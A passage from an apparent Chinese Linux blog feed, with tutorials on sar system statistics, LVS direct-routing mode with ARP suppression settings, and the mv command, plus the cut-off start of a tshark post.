0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #tps 磁盘每秒钟的IO总数，等于iostat中的tps #rtps 每秒钟从磁盘读取的IO总数 #wtps 每秒钟从写入到磁盘的IO总数 #bread/s 每秒钟从磁盘读取的块总数 #bwrtn/s 每秒钟此写入到磁盘的块总数 实例7：磁盘使用详情统计&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# sar -d 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时45分57秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时45分58秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分58秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分58秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时45分59秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分59秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分59秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时46分00秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时46分00秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util平均时间: dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #DEV 磁盘设备的名称，如果不加-p，会显示dev253-0类似的设备名称，因此加上-p显示的名称更直接 #tps：每秒I/O的传输总数 #rd_sec/s 每秒读取的扇区的总数 #wr_sec/s 每秒写入的扇区的 总数 #avgrq-sz 平均每次次磁盘I/O操作的数据大小（扇区） #avgqu-sz 磁盘请求队列的平均长度 #await 从请求磁盘操作到系统完成处理，每次请求的平均消耗时间，包括请求队列等待时间，单位是毫秒（1秒等于1000毫秒），等于寻道时间+队列时间+服务时间 #svctm I/O的服务处理时间，即不包括请求队列中的时间 #%util I/O请求占用的CPU百分比，值越高，说明I/O越慢 实例8：进程、inode、文件和锁表状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -v &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -v 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时49分02秒 dentunusd file-nr inode-nr pty-nr13时49分03秒 16295 672 12498 213时49分04秒 16295 672 12498 213时49分05秒 16295 672 12498 2平均时间: 16295 672 12498 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #dentunusd 在缓冲目录条目中没有使用的条目数量 #file-nr 被系统使用的文件句柄数量 #inode-nr 已经使用的索引数量 #pty-nr 使用的pty数量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里面的索引和文件句柄值不是ulimit -a查看到的值，而是sysctl.conf里面定义的和内核相关的值， max-file表示系统级别的能够打开的文件句柄的数量， 而ulimit -n控制进程级别能够打开的文件句柄的数量，可以使用sysctl -a | grep inode和sysctl -a | grep file查看，具体含义如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file-max中指定了系统范围内所有进程可打开的文件句柄的数量限制(系统级别， kernel-level)。 （The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate）。当收到”Too many open files in system”这样的错误消息时， 就应该曾加这个值了。 123# cat /proc/sys/fs/file-max4096# echo 100000 &gt; /proc/sys/fs/file-max &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 12# echo ""fs.file-max=65535" &gt;&gt; /etc/sysctl.conf# sysctl -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file-nr 可以查看系统中当前打开的文件句柄的数量。 他里面包括3个数字： 第一个表示已经分配了的文件描述符数量， 第二个表示空闲的文件句柄数量， 第三个表示能够打开文件句柄的最大值（跟file-max一致）。 内核会动态的分配文件句柄， 但是不会再次释放他们（这个可能不适应最新的内核了， 在我的file-nr中看到第二列一直为0， 第一列有增有减） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;man bash， 找到说明ulimit的那一节：提供对shell及其启动的进程的可用资源（包括文件句柄， 进程数量， core文件大小等）的控制。 这是进程级别的， 也就是说系统中某个session及其启动的每个进程能打开多少个文件描述符， 能fork出多少个子进程等… 当达到上限时， 会报错”Too many open files”或者遇上Socket/File: Can’t open so many files等 12345[root@localhost ~]# sysctl fs.file-nrfs.file-nr = 672 0 187015You have new mail in /var/spool/mail/root[root@localhost ~]# sysctl -a | grep fs.file-nrfs.file-nr = 672 0 187015 实例9：统计网络信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar -n选项使用6个不同的开关：DEV，EDEV，NFS，NFSD，SOCK，IP，EIP，ICMP，EICMP，TCP，ETCP，UDP，SOCK6，IP6，EIP6，ICMP6，EICMP6和UDP6 ，DEV显示网络接口信息，EDEV显示关于网络错误的统计数据，NFS统计活动的NFS客户端的信息，NFSD统计NFS服务器的信息，SOCK显示套接字信息，ALL显示所有5个开关。它们可以单独或者一起使用。 每间隔1秒统计一次，总计统计1次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n DEV 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# sar -n DEV 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时56分20秒 IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s13时56分21秒 lo 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时56分21秒 eth0 1.01 1.01 0.06 0.17 0.00 0.00 0.00平均时间: IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s平均时间: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: eth0 1.01 1.01 0.06 0.17 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #IFACE 本地网卡接口的名称 #rxpck/s 每秒钟接受的数据包 #txpck/s 每秒钟发送的数据库 #rxKB/S 每秒钟接受的数据包大小，单位为KB #txKB/S 每秒钟发送的数据包大小，单位为KB #rxcmp/s 每秒钟接受的压缩数据包 #txcmp/s 每秒钟发送的压缩包 #rxmcst/s 每秒钟接收的多播数据包 统计网络设备通信失败信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n EDEV 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# sar -n EDEV 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时59分23秒 IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s13时59分24秒 lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时59分24秒 eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s平均时间: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #IFACE 网卡名称 #rxerr/s 每秒钟接收到的损坏的数据包 #txerr/s 每秒钟发送的数据包错误数 #coll/s 当发送数据包时候，每秒钟发生的冲撞（collisions）数，这个是在半双工模式下才有 #rxdrop/s 当由于缓冲区满的时候，网卡设备接收端每秒钟丢掉的网络包的数目 #txdrop/s 当由于缓冲区满的时候，网络设备发送端每秒钟丢掉的网络包的数目 #txcarr/s 当发送数据包的时候，每秒钟载波错误发生的次数 #rxfram 在接收数据包的时候，每秒钟发生的帧对其错误的次数 #rxfifo 在接收数据包的时候，每秒钟缓冲区溢出的错误发生的次数 #txfifo 在发生数据包 的时候，每秒钟缓冲区溢出的错误发生的次数 统计socket连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n SOCK 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# sar -n SOCK 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)14时02分35秒 totsck tcpsck udpsck rawsck ip-frag tcp-tw14时02分36秒 389 5 5 0 0 0平均时间: 389 5 5 0 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #totsck 当前被使用的socket总数 #tcpsck 当前正在被使用的TCP的socket总数 #udpsck 当前正在被使用的UDP的socket总数 #rawsck 当前正在被使用于RAW的skcket总数 #if-frag 当前的IP分片的数目 #tcp-tw TCP套接字中处于TIME-WAIT状态的连接数量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用FULL关键字，相当于上述DEV、EDEV和SOCK三者的综合 TCP连接的统计&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n TCP 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -n TCP 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)14时05分30秒 active/s passive/s iseg/s oseg/s14时05分31秒 0.00 0.00 0.00 0.0014时05分32秒 0.00 0.00 1.04 1.0414时05分33秒 0.00 0.00 1.00 1.00平均时间: 0.00 0.00 0.68 0.68 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #active/s 新的主动连接 #passive/s 新的被动连接 #iseg/s 接受的段 #oseg/s 输出的段 sar -n 使用总结 -n DEV ： 网络接口统计信息。 -n EDEV ： 网络接口错误。 -n IP ： IP数据报统计信息。 -n EIP ： IP错误统计信息。 -n TCP ： TCP统计信息。 -n ETCP ： TCP错误统计信息。 -n SOCK ： 套接字使用。 常用命令汇总&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因版本和平台不同，有部分命令可能没有或显示结果不一致： sar -b 5 5 IO传送速率 sar -B 5 5 页交换速率 sar -c 5 5 进程创建的速率 sar -d 5 5 块设备的活跃信息 sar -n DEV 5 5 网路设备的状态信息 sar -n SOCK 5 5 SOCK的使用情况 sar -n ALL 5 5 所有的网络状态信息 sar -P ALL 5 5 每颗CPU的使用状态信息和IOWAIT统计状态 sar -q 5 5 队列的长度（等待运行的进程数）和负载的状态 sar -r 5 5 内存和swap空间使用情况 sar -R 5 5 内存的统计信息（内存页的分配和释放、系统每秒作为BUFFER使用内存页、每秒被cache到的内存页） `sar -u 5 5 CPU的使用情况和IOWAIT信息（同默认监控） sar -v 5 5 inode, file and other kernel tablesd的状态信息 sar -w 5 5 每秒上下文交换的数目 sar -W 5 5 SWAP交换的统计信息(监控状态同iostat 的si so) sar -x 2906 5 5 显示指定进程(2906)的统计信息，信息包括：进程造成的错误、用户级和系统级用户CPU的占用情况、运行在哪颗CPU上 sar -y 5 5 TTY设备的活动状态 将输出到文件(-o)和读取记录信息(-f)]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS 的 dr 模式]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F1.%20LVS%20%E7%9A%84%20dr%20%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[LVS 的 dr 模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dr模式最稳定，用的最多的时候，当realserver处理完请求以后，直接返回给用户，避免lvs的瓶颈 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dr模式：调度器将请求来的数据包的目标mac地址改为real server的mac地址，返回的时候也不经过调度器，直接返回给客户端 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;arp广播：地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先了解arp广播：根据ip地址找mac地址 主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当主机A要与主机B通信时： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。 整个请求过程如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;client在发起请求之前，会发一个arp广播的包，在网络中找“谁是vip”，由于所有的服务器，lvs和res都有vip，为了让client的请求送到lvs上，所以必须让res不能响应client发出的arp请求，（这也是为什么要禁止res上arp的请求和响应）下面就是lvs转发的事情了： client向目标vip发送请求，lvs接收；此时ip包和数据信息如下： 12src mac dst mac src_ip dst_ip 192.168.147.1 192.168.147.150 lvs根据负载均衡的算法，选择一台realserver，然后把realserver1的mac地址作为目的mac地址，发送到局域网中 12src mac dst mac src_ip dst_ip 192.168.147.1 192.168.147.150 realserver1在局域网中收到这个请求以后，发现目的ip和本地匹配，于是进行处理，处理完成以后，直接把源ip和目的ip直接对调，然后经过网关直接返回给用户； 12345678910111213src mac dst mac src_ip dst_ip 192.168.147.150 192.168.147.1``` ## 问题realserver如何抑制arp请求```bashecho "1" &gt;/proc/sys/net/ipv4/conf/lo/arp_ignoreecho "2" &gt;/proc/sys/net/ipv4/conf/lo/arp_announceecho "1" &gt;/proc/sys/net/ipv4/conf/all/arp_ignoreecho "2" &gt;/proc/sys/net/ipv4/conf/all/arp_announce]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- mv]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F8.%20Linux%20%E5%91%BD%E4%BB%A4-%20mv%2F</url>
    <content type="text"><![CDATA[Linux 基础命令- mv&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常用的命令，经常用来备份文件或者目录。 1．命令格式：1mv [选项] [源文件或目录] [目标文件或目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移至一个新的目录中。当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录名），它将所给的源文件或目录重命名为给定的目标文件名。当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。在跨文件系统移动文件时，mv先拷贝，再将原有文件删除，而链至该文件的链接也将丢失。 3．命令参数： -b ：若需覆盖文件，则覆盖前先行备份。 -f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖； -i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！ -u ：若目标文件已经存在，且 source 比较新，才会更新(update) -t ： –target-directory=DIRECTORY move all SOURCE arguments into DIRECTORY，即指定mv的目标目录，该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后。 4．命令实例：实例1：文件改名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test.log test1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5-rw-r--r-- 1 root root 16 10-28 06:04 test.log[root@localhost test]# mv test.log test1.txt[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scf-rw-r--r-- 1 root root 16 10-28 06:04 test1.txtdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件test.log重命名为test1.txt 实例2：移动文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test1.txt test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scf-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# mv test1.txt test3[root@localhost test]# ll总计 16drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 06:09 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# ll总计 4-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将test1.txt文件移到目录test3中 实例3：将文件log1.txt,log2.txt,log3.txt移动到目录test3中。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12mv log1.txt log2.txt log3.txt test3mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415161718192021222324252627282930313233[root@localhost test]# ll总计 28-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txtdrwxrwxrwx 2 root root 4096 10-28 06:09 test3[root@localhost test]# mv log1.txt log2.txt log3.txt test3[root@localhost test]# ll总计 16drwxrwxrwx 2 root root 4096 10-28 06:18 test3[root@localhost test]# cd test3/[root@localhost test3]# ll总计 16-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]#[root@localhost test3]# ll总计 20-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt [root@localhost test3]# cd ..[root@localhost test]# cd test4/[root@localhost test4]# ll总计 12-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mv log1.txt log2.txt log3.txt test3 命令将log1.txt ，log2.txt， log3.txt 三个文件移到 test3目录中去，mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt 命令又将三个文件移动到test4目录中去 实例4：将文件file1改名为file2，如果file2已经存在，则询问是否覆盖&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv -i log1.txt log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost test4]# ll总计 12-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log1.txt odfdfs[root@localhost test4]# cat log2.txt ererwerwer[root@localhost test4]# mv -i log1.txt log2.txt mv：是否覆盖“log2.txt”? y[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# 实例5：将文件file1改名为file2，即使file2存在，也是直接覆盖掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv -f log3.txt log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223[root@localhost test4]# ll总计 8-rw-r--r-- 1 root root 8 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# cat log3cat: log3: 没有那个文件或目录[root@localhost test4]# ll总计 8-rw-r--r-- 1 root root 8 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# cat log3.txt dfosdfsdfdss[root@localhost test4]# mv -f log3.txt log2.txt [root@localhost test4]# cat log2.txt dfosdfsdfdss[root@localhost test4]# ll总计 4-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log3.txt的内容直接覆盖了log2.txt内容，-f 这是个危险的选项，使用的时候一定要保持头脑清晰，一般情况下最好不用加上它。 实例6：目录的移动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv dir1 dir2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223242526[root@localhost test4]# ll-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# ll-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# cd ..[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 3 root root 4096 10-28 06:24 test3drwxr-xr-x 2 root root 4096 10-28 06:48 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# cd ..[root@localhost test]# mv test4 test3[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 4 root root 4096 10-28 06:54 test3drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3/[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 06:48 test4[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果目录dir2不存在，将目录dir1改名为dir2；否则，将dir1移动到dir2中。 实例7：移动当前文件夹下的所有文件到上一级目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv * ../ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112[root@localhost test4]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# mv * ../[root@localhost test4]# ll[root@localhost test4]# cd ..[root@localhost test3]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 07:02 test4 实例8：把当前目录的一个子目录里的文件移动到另一个子目录里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test3/*.txt test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 4 root root 4096 10-28 07:02 test3drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 07:02 test4[root@localhost test3]# cd ..[root@localhost test]# mv test3/*.txt test5[root@localhost test]# cd test5[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# cd ..[root@localhost test]# cd test3/[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logsdrwxr-xr-x 2 root root 4096 10-28 07:02 test4[root@localhost test3]# 实例9：文件被覆盖前做简单备份，前面加参数-b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv log1.txt -b log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# mv log1.txt -b log2.txtmv：是否覆盖“log2.txt”? y[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt~-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-b 不接受参数，mv会去读取环境变量VERSION_CONTROL来作为备份策略。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;–backup该选项指定如果目标文件存在时的动作，共有四种备份策略： CONTROL=none或off : 不备份。 CONTROL=numbered或t：数字编号的备份 CONTROL=existing或nil：如果存在以数字编号的备份，则继续编号备份m+1…n：执行mv操作前已存在以数字编号的文件log2.txt.~1~，那么再次执行将产生log2.txt~2~，以次类推。如果之前没有以数字编号的文件，则使用下面讲到的简单备份。 CONTROL=simple或never：使用简单备份：在被覆盖前进行了简单备份，简单备份只能有一份，再次被覆盖时，简单备份也会被覆盖。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tshark]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F80.%20Linux%20%E5%91%BD%E4%BB%A4-%20tshark%2F</url>
    <content type="text"><![CDATA[Linux 命令- tshark&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux下，当我们需要抓取网络数据包分析时，通常是使用tcpdump抓取网络raw数据包存到一个文件，然后下载到本地使用wireshark界面网络分析工具进行网络包分析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最近才发现，原来wireshark也提供有Linux命令行工具-tshark。tshark不仅有抓包的功能，还带了解析各种协议的能力。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tshark是wireshark安装目录下命令行工具 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用tshark可以通过自动化方式调用wireshark &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认机器上是没有安装这个工具的。使用yum安装 1yum install -y wireshark &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以到官网下载源码，具体安装方法 命令参数1. 抓包接口类 -i 设置抓包的网络接口，不设置则默认为第一个非自环接口。 -D 列出当前存在的网络接口。在不了解OS所控制的网络设备时，一般先用“tshark -D”查看网络接口的编号以供-i参数使用。 -f 